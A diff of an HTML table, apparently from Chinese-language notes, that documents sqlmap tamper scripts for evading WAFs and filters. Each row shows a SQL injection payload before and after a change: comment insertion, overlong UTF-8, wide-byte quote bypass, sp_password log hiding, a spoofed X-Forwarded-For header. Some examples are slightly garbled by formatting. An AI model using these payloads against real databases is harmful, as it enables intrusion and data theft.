@@ -118,147 +118,183 @@ sqlmap中所有的tamper：
     <tr>
       <td style="text-align:left">greatest.py</td>
       <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">1 AND A &gt; B ==&gt; 1 AND GREATEST(A, B+1)=A</td>
     </tr>
     <tr>
       <td style="text-align:left">halfversionedmorekeywords.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7A7A;&#x683C; ==&gt; /*!0 &#xFF08;&#x5728;&#x5173;&#x952E;&#x5B57;&#x524D;&#x6DFB;&#x52A0;&#x6CE8;&#x91CA;&#xFF09;</td>
+      <td
+      style="text-align:left">union ==&gt; /*!0union</td>
     </tr>
     <tr>
       <td style="text-align:left">ifnull2ifisnull.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">IFNULL(A, B) ==&gt; IF(ISNULL(A), B, A)</td>
+      <td style="text-align:left">IFNULL(1, 2) ==&gt; IF(ISNULL(1),2,1)</td>
     </tr>
     <tr>
       <td style="text-align:left">informationschemacomment.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">
+        <p>&#x5728; information_schema &#x540E;&#x9762;&#x52A0;&#x4E0A; /**/ &#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;&#x5BF9;
+          information_schema &#x7684;&#x60C5;&#x51B5;</p>
+        <p>retVal = re.sub(r&quot;(?i)(information_schema).&quot;, &quot;g&lt;1&gt;/**/.&quot;,
+          payload)</p>
+      </td>
+      <td style="text-align:left">select table_name from information_schema.tables ==&gt; select table_name
+        from information_schema/**/.tables</td>
     </tr>
     <tr>
       <td style="text-align:left">lowercase.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5C06; payload &#x91CC;&#x7684;&#x5927;&#x5199;&#x8F6C;&#x4E3A;&#x5C0F;&#x5199;</td>
+      <td
+      style="text-align:left">SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==&gt; select table_name
+        from information_schema.tables</td>
     </tr>
     <tr>
       <td style="text-align:left">modsecurityversioned.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x6765;&#x5305;&#x56F4;&#x5B8C;&#x6574;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;
+        ModSecurity &#x5F00;&#x6E90; waf</td>
+      <td style="text-align:left">1 AND 2&gt;1-- ==&gt; 1 /<em>!30874AND 2&gt;1</em>/--</td>
     </tr>
     <tr>
       <td style="text-align:left">modsecurityzeroversioned.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x6765;&#x5305;&#x56F4;&#x5B8C;&#x6574;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;
+        waf &#xFF0C;&#x548C;&#x4E0A;&#x9762;&#x7C7B;&#x4F3C;</td>
+      <td style="text-align:left">1 and 2&gt;1--+ ==&gt; 1 /!00000and 2&gt;1/--+</td>
     </tr>
     <tr>
       <td style="text-align:left">multiplespaces.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x56F4;&#x7ED5;SQL&#x5173;&#x952E;&#x5B57;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x7A7A;&#x683C;</td>
+      <td
+      style="text-align:left">1 UNION SELECT foobar ==&gt; 1 UNION SELECT foobar</td>
     </tr>
     <tr>
       <td style="text-align:left">nonrecursivereplacement.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5173;&#x952E;&#x5B57;&#x53CC;&#x5199;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;</td>
+      <td
+      style="text-align:left">1 UNION SELECT 2-- ==&gt; 1 UNIONUNION SELESELECTCT 2--</td>
     </tr>
     <tr>
       <td style="text-align:left">overlongutf8.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x8F6C;&#x6362;&#x7ED9;&#x5B9A;&#x7684;payload&#x5F53;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x5B57;&#x7B26;</td>
+      <td
+      style="text-align:left">SELECT FIELD FROM TABLE WHERE 2&gt;1 ==&gt; SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1</td>
     </tr>
     <tr>
       <td style="text-align:left">percentage.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x767E;&#x5206;&#x53F7;&#x6765;&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;&#xFF0C;&#x5728;&#x5173;&#x952E;&#x5B57;&#x7684;&#x6BCF;&#x4E2A;&#x5B57;&#x6BCD;&#x524D;&#x9762;&#x90FD;&#x52A0;&#x4E00;&#x4E2A;(%)</td>
+      <td
+      style="text-align:left">SELECT FIELD FROM TABLE ==&gt; %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td>
     </tr>
     <tr>
       <td style="text-align:left">randomcase.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5C06; payload &#x968F;&#x673A;&#x5927;&#x5C0F;&#x5199;</td>
+      <td style="text-align:left">INSERT ==&gt; InseRt</td>
     </tr>
     <tr>
       <td style="text-align:left">randomcomments.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5728; payload &#x7684;&#x5173;&#x952E;&#x5B57;&#x4E2D;&#x95F4;&#x968F;&#x673A;&#x63D2;&#x5165;&#x6CE8;&#x91CA;&#x7B26;
+        /**/ &#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;&#x8FC7;&#x6EE4;</td>
+      <td
+      style="text-align:left">INSERT ==&gt; I / <b> / N / </b> / SERT</td>
     </tr>
     <tr>
       <td style="text-align:left">securesphere.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5728;payload&#x540E;&#x8FFD;&#x52A0;&#x7279;&#x6B8A;&#x6784;&#x9020;&#x7684;&#x5B57;&#x7B26;&#x4E32;</td>
+      <td
+      style="text-align:left">1 AND 1=1 ==&gt; 1 AND 1=1 and &apos;0having&apos;=&apos;0having&apos;</td>
     </tr>
     <tr>
       <td style="text-align:left">space2comment.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x6CE8;&#x91CA;&#x7B26; // &#x4EE3;&#x66FF;&#x7A7A;&#x683C;&#xFF0C;&#x7528;&#x4E8E;&#x7A7A;&#x683C;&#x7684;&#x7ED5;&#x8FC7;</td>
+      <td
+      style="text-align:left">SELECT id FROM users ==&gt; SELECT//id//FROM//users</td>
     </tr>
     <tr>
       <td style="text-align:left">space2dash.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;[&#x6CE8;&#x91CA;&#x7B26;(--)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
+      <td
+      style="text-align:left">union select 1,2--+ ==&gt; union--HSHjsJh%0Aselect--HhjHSJ%0A1,2--+</td>
     </tr>
     <tr>
       <td style="text-align:left">space2hash.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;[&#x6CE8;&#x91CA;&#x7B26;(#)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
+      <td
+      style="text-align:left">union select 1,2--+ ==&gt; union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2--+</td>
     </tr>
     <tr>
       <td style="text-align:left">space2morehash.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x591A;&#x4E2A;[&#x6CE8;&#x91CA;&#x7B26;(#)+&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;+&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;&#x63A7;&#x5236;&#x7B26;</td>
+      <td
+      style="text-align:left">union select 1,2--+ ==&gt; union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23
+        HJHJhj %0A 1,2--+</td>
     </tr>
     <tr>
       <td style="text-align:left">space2mssqlblank.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x968F;&#x673A;&#x7684;&#x7A7A;&#x767D;&#x7B26;&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
+      <td
+      style="text-align:left">SELECT id FROM users ==&gt; SELECT%0Eid%0DFROM%07users</td>
     </tr>
     <tr>
       <td style="text-align:left">space2mssqlhash.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;[&#x5B57;&#x7B26;# +&#x4E00;&#x4E2A;&#x6362;&#x884C;&#x7B26;]&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
+      <td
+      style="text-align:left">union select 1,2--+ ==&gt; union%23%0Aselect%23%0A1,2--+</td>
     </tr>
     <tr>
       <td style="text-align:left">space2plus.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x52A0;&#x53F7;(+)&#x66FF;&#x6362;&#x7A7A;&#x683C;</td>
+      <td style="text-align:left">SELECT id FROM users ==&gt; SELECT+id+FROM+users</td>
     </tr>
     <tr>
       <td style="text-align:left">space2randomblank.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x968F;&#x673A;&#x7684;&#x7A7A;&#x767D;&#x7B26;&#x66FF;&#x6362;payload&#x4E2D;&#x7684;&#x7A7A;&#x683C;</td>
+      <td
+      style="text-align:left">SELECT id FROM users ==&gt; SELECT%0Did%0DFROM%0Ausers</td>
     </tr>
     <tr>
       <td style="text-align:left">sp_password.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5728;payload&#x8BED;&#x53E5;&#x540E;&#x6DFB;&#x52A0; sp_password &#xFF0C;&#x7528;&#x4E8E;&#x8FF7;&#x60D1;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;&#xFF08;Space
+        ==&gt; sp_password&#xFF09;</td>
+      <td style="text-align:left">1 AND 9227=9227-- ==&gt; 1 AND 9227=9227 -- sp_password</td>
     </tr>
     <tr>
       <td style="text-align:left">symboliclogical.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528; &amp;&amp; &#x66FF;&#x6362; and &#xFF0C;&#x7528; || &#x66FF;&#x6362;
+        or &#xFF0C;&#x7528;&#x4E8E;&#x8FD9;&#x4E9B;&#x5173;&#x952E;&#x5B57;&#x88AB;&#x8FC7;&#x6EE4;&#x7684;&#x60C5;&#x51B5;</td>
+      <td
+      style="text-align:left">
+        <p>1 and 1=1 ==&gt; 1 %26%26 1=1</p>
+        <p>1 or 1=1 ==&gt; 1 %7c%7c 1=1</p>
+        </td>
     </tr>
     <tr>
       <td style="text-align:left">unionalltounion.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528; union select &#x66FF;&#x6362;union all select</td>
+      <td style="text-align:left">union all select 1,2--+ ==&gt; union select 1,2--+</td>
     </tr>
     <tr>
       <td style="text-align:left">unmagicquotes.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x7528;&#x5BBD;&#x5B57;&#x7B26;&#x7ED5;&#x8FC7; GPC addslashes</td>
+      <td
+      style="text-align:left">1&apos; and 1=1 ==&gt; 1%df%27 and 1=1--</td>
     </tr>
     <tr>
       <td style="text-align:left">uppercase.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5C06;payload&#x4E2D;&#x7684;&#x5C0F;&#x5199;&#x5B57;&#x6BCD;&#x8F6C;&#x4E3A;&#x5927;&#x5199;&#x683C;&#x5F0F;</td>
+      <td
+      style="text-align:left">insert ==&gt; INSERT</td>
     </tr>
     <tr>
       <td style="text-align:left">varnish.py</td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;HTTP&#x5934;&#x201C; X-originating-IP
+        &#x201D;&#x6765;&#x7ED5;&#x8FC7;WAF</td>
       <td style="text-align:left"></td>
     </tr>
     <tr>
       <td style="text-align:left">versionedkeywords.py</td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
+      <td style="text-align:left">&#x5BF9;&#x975E;&#x51FD;&#x6570;&#x7684;&#x5173;&#x952E;&#x5B57;&#x8FDB;&#x884C;&#x6CE8;&#x91CA;</td>
+      <td
+      style="text-align:left">1 union select user() ==&gt; 1/!UNION//!SELECT/user()</td>
     </tr>
     <tr>
       <td style="text-align:left">versionedmorekeywords.py</td>
@@ -272,96 +308,6 @@ sqlmap中所有的tamper：
         X-Forwarded-For &#x201D;&#x6765;&#x7ED5;&#x8FC7;WAF</td>
       <td style="text-align:left">headers = kwargs.get(&quot;headers&quot;, {})headers[&quot;X-Forwarded-For&quot;]
         = randomIP()return payload</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-    </tr>
-    <tr>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
-      <td style="text-align:left"></td>
     </tr>
   </tbody>
 </table>
